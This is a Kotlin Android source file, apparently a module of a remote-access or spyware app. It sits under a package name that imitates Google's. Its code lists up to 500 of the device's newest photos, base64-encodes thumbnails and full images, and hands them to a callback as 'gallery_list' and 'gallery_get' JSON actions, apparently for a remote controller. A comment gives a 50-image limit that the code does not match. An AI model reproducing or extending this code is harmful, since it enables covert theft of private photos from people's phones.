package com.google.xmodzz

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.provider.MediaStore
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream

object GalleryRechive {
    fun listImages(ctx: Context, emit: (JSONObject) -> Unit) {
        val res = JSONArray()
        
        // URUTKAN DARI YANG TERBARU (DESC)
        val c = ctx.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
            arrayOf(
                MediaStore.Images.Media._ID, 
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
            ), 
            null, 
            null, 
            "${MediaStore.Images.Media.DATE_ADDED} DESC"
        )
        
        var count = 0
        c?.use { 
            // BATASI 50 GAMBAR TERBARU BIAR GA OOM / BERAT
            while (it.moveToNext() && count < 500) { 
                val id = it.getLong(0)
                val name = it.getString(1) ?: "img"
                val dateSec = it.getLong(2)
                
                val o = JSONObject()
                o.put("id", id)
                o.put("name", name)
                o.put("date", dateSec * 1000) // Ubah ke milidetik buat JS
                
                // GENERATE THUMBNAIL BASE64 LANGSUNG DI LIST
                try {
                    val uri = android.content.ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val input = ctx.contentResolver.openInputStream(uri)
                    
                    val options = BitmapFactory.Options()
                    options.inSampleSize = 6 // Kecilin resolusi biar ringan & ga OOM
                    val bitmap = BitmapFactory.decodeStream(input, null, options)
                    input?.close()
                    
                    if (bitmap != null) {
                        val baos = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                        val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                        o.put("thumb", "data:image/jpeg;base64,$b64")
                        bitmap.recycle()
                    }
                } catch (e: Exception) {
                    o.put("thumb", "")
                }
                
                res.put(o) 
                count++
            } 
        }
        
        emit(JSONObject().put("action", "gallery_list").put("data", res))
    }
    
    fun sendImage(ctx: Context, idStr: String, emit: (JSONObject) -> Unit) {
        try {
            val uri = android.content.ContentUris.withAppendedId(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 
                idStr.toLong()
            )
            
            val input = ctx.contentResolver.openInputStream(uri)
            val options = BitmapFactory.Options()
            options.inSampleSize = 2 // Kecilin dikit biar ga OOM saat dibuka
            val bitmap = BitmapFactory.decodeStream(input, null, options)
            input?.close()
            
            if (bitmap != null) {
                val baos = ByteArrayOutputStream()
                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos)
                val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
                bitmap.recycle()
                
                emit(JSONObject().put("action", "gallery_get").put("id", idStr).put("data", b64))
            }
        } catch (e: Exception) {
            emit(JSONObject().put("action", "gallery_get").put("id", idStr).put("error", "Gagal load"))
        }
    }
}
